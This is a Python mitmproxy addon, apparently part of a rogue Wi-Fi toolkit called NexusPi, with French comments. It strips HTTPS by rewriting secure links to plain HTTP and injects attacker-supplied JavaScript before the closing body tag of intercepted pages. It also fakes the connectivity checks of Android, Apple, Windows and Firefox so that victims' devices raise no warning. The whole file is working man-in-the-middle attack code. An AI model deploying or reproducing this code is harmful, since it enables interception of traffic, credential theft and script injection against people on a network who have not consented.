"""
NexusPi — addon mitmproxy : injection HTML + SSL strip + captive probes.

Chargé par mitmdump (mode mitm_https) avec :
    mitmdump --mode transparent --listen-port 8080 -s mitmproxy_inject.py

Variables d'env (positionnées par wifi.py) :
    NEXUSPI_INJECT       JS à injecter avant </body> (vide = pas d'injection)
    NEXUSPI_STRIP_HTTPS  "1" pour réécrire <a href="https://..."> en http://
                         (attention HSTS : la plupart des grands sites résistent)

Captive probes : on intercepte les checks de connectivité OS et on répond
"OK" immédiatement → l'OS ne montre PAS le warning "pas d'internet".
"""
import os
import re

INJECT_SCRIPT = (os.environ.get("NEXUSPI_INJECT") or "").strip()
STRIP_HTTPS = os.environ.get("NEXUSPI_STRIP_HTTPS") == "1"

_INJECTION_BYTES = (
    f"<script>{INJECT_SCRIPT}</script>".encode("utf-8")
    if INJECT_SCRIPT else b""
)

_HTTPS_HREF_RE = re.compile(
    rb'(<a\s[^>]*href\s*=\s*["\'])https://([^"\'\s>]+)',
    re.IGNORECASE,
)

# Patterns de probes de connectivité par OS. Match large : si le path
# CONTIENT le pattern (peu importe le host ou la query string), on répond.
# Réponses attendues par chaque OS :
_204_PATTERNS = (
    "/generate_204",       # Android, Chrome (gstatic / clients[34] / google.cn / honor)
    "/gen_204",            # variante Android
)
_APPLE_HTML_PATTERNS = (
    "/hotspot-detect.html",        # iOS / macOS
    "/library/test/success.html",  # macOS WiFi assist
)
_MS_PATTERNS = (
    "/connecttest.txt",    # Windows NCSI
    "/ncsi.txt",
)
_FIREFOX_PATTERNS = (
    "/canonical.html",
    "/success.txt",
)

_APPLE_HTML = (b"<HTML><HEAD><TITLE>Success</TITLE></HEAD>"
               b"<BODY>Success</BODY></HTML>")


def request(flow):
    """
    Hook AVANT que mitmproxy contacte le serveur réel.
    On intercepte les captive probes et on répond direct → 0 latence.
    Match large : on regarde uniquement le path (stripé de la query),
    ignore le host (couvre TOUS les domaines : gstatic, hihonor, google.cn, etc.)
    """
    if not flow.request:
        return
    path = (flow.request.path or "/").split("?")[0]
    host = (flow.request.host or "").lower()

    from mitmproxy import http

    # 204 No Content (Android / Chrome / Honor / etc.)
    for p in _204_PATTERNS:
        if path.endswith(p):
            flow.response = http.Response.make(204, b"",
                {"Content-Type": "text/html", "Connection": "close"})
            return

    # iOS / macOS — Success HTML
    for p in _APPLE_HTML_PATTERNS:
        if path.endswith(p):
            flow.response = http.Response.make(200, _APPLE_HTML,
                {"Content-Type": "text/html", "Connection": "close"})
            return

    # Microsoft (Windows NCSI)
    if path.endswith("/connecttest.txt"):
        flow.response = http.Response.make(200, b"Microsoft Connect Test",
            {"Content-Type": "text/plain", "Connection": "close"})
        return
    if path.endswith("/ncsi.txt"):
        flow.response = http.Response.make(200, b"Microsoft NCSI",
            {"Content-Type": "text/plain", "Connection": "close"})
        return

    # Firefox
    for p in _FIREFOX_PATTERNS:
        if path.endswith(p):
            flow.response = http.Response.make(200,
                b"<html><body>success</body></html>",
                {"Content-Type": "text/html", "Connection": "close"})
            return


def response(flow):
    """Hook après réception de la réponse : injection / strip."""
    resp = getattr(flow, "response", None)
    if not resp:
        return
    ctype = (resp.headers.get("content-type") or "").lower()
    if "text/html" not in ctype:
        return
    body = resp.content
    if not body:
        return

    # 1. SSL strip — rewrite <a href="https://..."> → http://
    if STRIP_HTTPS:
        body = _HTTPS_HREF_RE.sub(rb'\1http://\2', body)

    # 2. Injection JS avant </body>
    if _INJECTION_BYTES:
        for tag in (b"</body>", b"</BODY>", b"</Body>"):
            if tag in body:
                body = body.replace(tag, _INJECTION_BYTES + tag, 1)
                break
        else:
            body = body + _INJECTION_BYTES

    if body != resp.content:
        resp.content = body
